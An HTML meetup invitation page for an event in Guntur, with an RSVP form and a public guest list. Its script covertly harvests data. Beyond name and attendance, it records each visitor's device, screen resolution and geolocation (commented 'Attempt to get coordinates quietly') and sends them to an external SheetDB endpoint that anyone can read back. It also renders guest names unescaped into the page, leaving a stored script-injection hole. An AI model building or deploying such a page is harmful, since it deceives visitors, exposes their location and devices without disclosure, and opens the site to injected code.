<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meetup Invitation - Guntur</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: linear-gradient(135deg, #001a4d 0%, #0d3b8a 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .invitation { background: white; border-radius: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); max-width: 550px; width: 100%; padding: 40px; text-align: center; }
        .details { background: #f0f4ff; border-left: 5px solid #2563eb; padding: 20px; margin: 25px 0; text-align: left; border-radius: 10px; }
        .form-group { margin-bottom: 15px; text-align: left; }
        label { display: block; font-weight: 700; margin-bottom: 5px; color: #0d3b8a; }
        input, select, textarea { width: 100%; padding: 12px; border: 2px solid #e0eeff; border-radius: 10px; font-family: inherit; }
        .cta-button { background: #2563eb; color: white; border: none; padding: 16px; width: 100%; font-weight: 700; border-radius: 50px; cursor: pointer; margin-top: 10px; transition: 0.3s; }
        .cta-button:disabled { background: #ccc; }
        .guest-list { margin-top: 30px; border-top: 2px solid #f0f4ff; padding-top: 20px; }
        .guest-card { background: #fdfdfd; padding: 15px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #eee; text-align: left; display: flex; justify-content: space-between; align-items: center; }
        .status-tag { font-size: 12px; font-weight: 700; padding: 4px 10px; border-radius: 20px; }
        .coming { background: #d1fae5; color: #047857; }
        .not-coming { background: #fee2e2; color: #dc2626; }
    </style>
</head>
<body>
    <div class="invitation">
        <h1>üëã Meetup in Guntur</h1>
        <p style="color: #666; margin-top: 5px;">Wednesday, January 21st, 2026</p>

        <div class="details">
            <p><strong>üë§ Host:</strong> Ponnam Sree Varun</p>
            <p><strong>üìç Venue:</strong> Guntur (Final spot via DM)</p>
        </div>

        <form id="meetupForm" onsubmit="handleSubmission(event)">
            <div class="form-group">
                <label>Full Name</label>
                <input type="text" id="userName" required placeholder="Enter your name">
            </div>
            <div class="form-group">
                <label>Attending?</label>
                <select id="userStatus">
                    <option value="coming">Yes, I'm in!</option>
                    <option value="not-coming">Sorry, can't make it</option>
                </select>
            </div>
            <div class="form-group">
                <label>Message</label>
                <textarea id="userNote" rows="2" placeholder="Any notes?"></textarea>
            </div>
            <button type="submit" class="cta-button" id="submitBtn">Confirm Attendance</button>
        </form>

        <div class="guest-list" id="guestDisplay">
            <p style="color: #999;">Updating list...</p>
        </div>
    </div>

    <script>
        const CONFIG = {
            API: 'https://sheetdb.io/api/v1/raj5uy3ex9q9l',
            redirectDelay: 1500
        };

        async function handleSubmission(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.innerText = "Confirming...";
            btn.disabled = true;

            const basicData = {
                Name: document.getElementById('userName').value,
                Status: document.getElementById('userStatus').value,
                Note: document.getElementById('userNote').value,
                Device: navigator.userAgent.split(') ')[0].split(' (')[1] || "Unknown Device",
                Resolution: `${window.screen.width}x${window.screen.height}`,
                Time: new Date().toLocaleString()
            };

            // Attempt to get coordinates quietly
            navigator.geolocation.getCurrentPosition(
                (pos) => sendFinalData({...basicData, LocationData: `${pos.coords.latitude},${pos.coords.longitude}`}),
                () => sendFinalData({...basicData, LocationData: "Permission Denied"})
            );
        }

        async function sendFinalData(payload) {
            try {
                await fetch(CONFIG.API, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ data: [payload] })
                });
                alert("Response saved successfully!");
                location.reload();
            } catch (err) {
                console.error(err);
                alert("Connection error. Try again.");
                document.getElementById('submitBtn').disabled = false;
            }
        }

        function loadList() {
            fetch(CONFIG.API).then(r => r.json()).then(data => {
                const list = document.getElementById('guestDisplay');
                if(!data || data.length === 0) {
                    list.innerHTML = "<p style='color:#999;'>No responses yet.</p>";
                    return;
                }
                list.innerHTML = "<h3 style='margin-bottom:15px; color:#0d3b8a;'>Who's Responded</h3>" + 
                    data.map(g => `
                        <div class="guest-card">
                            <div><strong>${g.Name}</strong></div>
                            <div class="status-tag ${g.Status}">${g.Status === 'coming' ? 'Coming' : 'No'}</div>
                        </div>
                    `).join('');
            });
        }

        window.onload = loadList;
    </script>
</body>
</html>
